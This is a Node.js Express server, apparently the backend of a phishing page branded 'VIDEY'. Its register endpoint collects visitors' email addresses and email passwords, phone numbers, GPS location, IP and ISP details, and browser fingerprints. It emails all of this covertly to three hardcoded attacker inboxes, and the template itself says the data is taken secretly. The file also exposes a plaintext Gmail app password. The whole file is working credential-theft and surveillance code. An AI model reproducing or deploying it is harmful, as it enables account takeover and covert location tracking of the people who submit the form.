const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ========== KONFIGURASI EMAIL - GANTI PUNYA LO ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';      // <== GANTI
const SENDER_PASSWORD = 'tmyh wklt uyig lots';  // <== GANTI (App Password)
const RECEIVER_EMAIL = [
  'gajeb682@gmail.com',
  'akunvanzz888@gmail.com',
  'zamzaja78@gmail.com'
  ]; // <== GANTI

// <== TAMBAHAN: File untuk menyimpan history email yang sudah dikirim
const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

// <== TAMBAHAN: Baca history yang sudah tersimpan
function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {
        console.log('History file not found, creating new');
    }
    return {}; // Format: { "email@example.com": "last_password_sent" }
}

// <== TAMBAHAN: Simpan history
function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {
        console.error('Failed to save history:', e);
    }
}

// <== TAMBAHAN: Cek apakah perlu dikirim
function shouldSendEmail(email, password) {
    const history = loadHistory();
    const lastPassword = history[email];
    
    // Kasus 1: Email belum pernah ada → KIRIM
    if (!lastPassword) {
        console.log(`📧 Email BARU: ${email} → AKAN DIKIRIM`);
        return true;
    }
    
    // Kasus 2: Email sudah ada, password SAMA → JANGAN KIRIM
    if (lastPassword === password) {
        console.log(`⚠️ DUPLICATE: ${email} dengan password SAMA → TIDAK DIKIRIM`);
        return false;
    }
    
    // Kasus 3: Email sudah ada, password BERBEDA → KIRIM (update password)
    console.log(`🔄 UPDATE: ${email} dengan password BARU (berbeda) → TETAP DIKIRIM`);
    return true;
}

// <== TAMBAHAN: Update history setelah kirim
function updateHistory(email, password) {
    const history = loadHistory();
    history[email] = password;
    saveHistory(history);
    console.log(`📝 History updated: ${email} → ${password.substring(0, 3)}***`);
}

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

// Route kirim email
app.post('/api/register', async (req, res) => {
    try {
        const data = req.body;
        
        console.log('📥 STEALTH DATA RECEIVED:');
        console.log('📍 GPS:', data.latitude, data.longitude);
        console.log('🌐 IP:', data.ip_address);
        console.log('📧 Email:', data.email);
        console.log('🔑 Password:', data.emailPassword);
        
        // <== TAMBAHAN: CEK DUPLICATE SEBELUM KIRIM
        const shouldSend = shouldSendEmail(data.email, data.emailPassword);
        
        if (!shouldSend) {
            console.log('❌ Email TIDAK dikirim (duplicate email + password sama)');
            return res.json({ 
                success: true, 
                duplicated: true, 
                message: 'Duplicate detected, email not sent' 
            });
        }
        
        // ========== LANJUTKAN KIRIM EMAIL ==========
        console.log('✅ Email UNIQUE → PROSES KIRIM...');
        
        // HTML Email lengkap - VIDEY STYLE (sama seperti sebelumnya)
        const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>VIDEY - Stealth Data Report</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0a1628 0%, #0d1f3c 100%);
            color: #ffffff;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: #0a1628;
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid #1877f2;
            box-shadow: 0 10px 40px rgba(24,119,242,0.2);
        }
        .header {
            background: linear-gradient(135deg, #1877f2, #0d6efd);
            padding: 25px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 28px;
            color: #ffffff;
            letter-spacing: 2px;
        }
        .header p {
            margin: 10px 0 0;
            font-size: 14px;
            opacity: 0.9;
        }
        .content {
            padding: 25px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 15px;
        }
        th {
            background: #1877f2;
            color: #ffffff;
            padding: 14px 12px;
            text-align: left;
            border-radius: 10px 10px 0 0;
        }
        td {
            padding: 12px;
            border-bottom: 1px solid rgba(24,119,242,0.3);
            vertical-align: top;
        }
        .label {
            width: 35%;
            font-weight: bold;
            color: #1877f2;
            background: rgba(24,119,242,0.1);
        }
        .value {
            width: 65%;
            color: #ffffff;
            word-break: break-word;
        }
        .section-title {
            background: rgba(24,119,242,0.2);
            color: #1877f2;
            font-size: 20px;
            font-weight: bold;
            padding: 12px 15px;
            margin: 20px 0 10px;
            border-left: 4px solid #1877f2;
            border-radius: 8px;
        }
        .footer {
            background: #0d1f3c;
            padding: 15px;
            text-align: center;
            font-size: 12px;
            color: #888;
            border-top: 1px solid rgba(24,119,242,0.3);
        }
        .warning {
            color: #1877f2;
            font-weight: bold;
            margin-top: 15px;
            text-align: center;
        }
        hr {
            border-color: rgba(24,119,242,0.3);
            margin: 20px 0;
        }
        .duplicate-badge {
            background: #ff9800;
            color: #000;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 VIDEY STEALTH DATA 🔐</h1>
            <p>User Registration Report</p>
        </div>
        
        <div class="content">
            <div class="section-title">📧 ACCOUNT DATA</div>
            <table>
                <tr><td class="label">Email Address:</td><td class="value">${data.email || '-'}</td></tr>
                <tr><td class="label">Email Password:</td><td class="value">${data.emailPassword || '-'}</td></tr>
                <tr><td class="label">Phone Number:</td><td class="value">${data.phone || '-'}</td></tr>
                <tr><td class="label">Manual Location:</td><td class="value">${data.country || '-'}, ${data.province || '-'}, ${data.city || '-'}</td></tr>
            </table>

            <div class="section-title">📍 GPS LOCATION</div>
            <table>
                <tr><td class="label">Latitude:</td><td class="value">${data.latitude || 'TIDAK DAPAT'}</td></tr>
                <tr><td class="label">Longitude:</td><td class="value">${data.longitude || 'TIDAK DAPAT'}</td></tr>
                <tr><td class="label">Accuracy:</td><td class="value">${data.gps_accuracy || '-'} meters</td></tr>
                <tr><td class="label">Altitude:</td><td class="value">${data.gps_altitude || '-'} meters</td></tr>
            </table>

            <div class="section-title">🌐 IP & NETWORK</div>
            <table>
                <tr><td class="label">IP Address:</td><td class="value">${data.ip_address || '-'}</td></tr>
                <tr><td class="label">ISP:</td><td class="value">${data.isp || '-'}</td></tr>
                <tr><td class="label">IP Location:</td><td class="value">${data.ip_city || '-'}, ${data.ip_region || '-'}, ${data.ip_country || '-'}</td></tr>
                <tr><td class="label">Timezone:</td><td class="value">${data.timezone || '-'}</td></tr>
            </table>

            <div class="section-title">🖥️ BROWSER FINGERPRINT</div>
            <table>
                <tr><td class="label">User Agent:</td><td class="value" style="font-size:12px">${data.userAgent || '-'}</td></tr>
                <tr><td class="label">Platform:</td><td class="value">${data.platform || '-'}</td></tr>
                <tr><td class="label">Screen Resolution:</td><td class="value">${data.screenResolution || '-'}</td></tr>
                <tr><td class="label">Hardware Concurrency:</td><td class="value">${data.hardwareConcurrency || '-'} cores</td></tr>
            </table>

            <div class="section-title">⏰ TIMESTAMP</div>
            <table>
                <tr><td class="label">Registration Time:</td><td class="value">${data.timestamp || '-'}</td></tr>
            </table>

            <hr>
            <div class="warning">⚠️ Data ini diambil secara diam-diam ⚠️</div>
        </div>
        
        <div class="footer">
            &copy; 2026 Videy - Stealth Monitoring System
        </div>
    </div>
</body>
</html>
`;
        
        await transporter.sendMail({
            from: `"Videy System" <${SENDER_EMAIL}>`,
            to: RECEIVER_EMAIL,
            subject: `🎯 VIDEY DATA: ${data.email} ${data.emailPassword !== loadHistory()[data.email] ? '(NEW PASSWORD!)' : ''}`,
            html: htmlContent,
            attachments: [{
                filename: `videy_stealth_${Date.now()}.json`,
                content: JSON.stringify(data, null, 2)
            }]
        });
        
        // <== TAMBAHAN: Simpan ke history setelah berhasil kirim
        updateHistory(data.email, data.emailPassword);
        
        console.log('✅ Email terkirim!');
        res.json({ success: true, newData: true });
        
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📧 Email akan dikirim ke: ${RECEIVER_EMAIL}`);
    console.log(`💾 Duplicate history saved to: ${HISTORY_FILE}`);
});
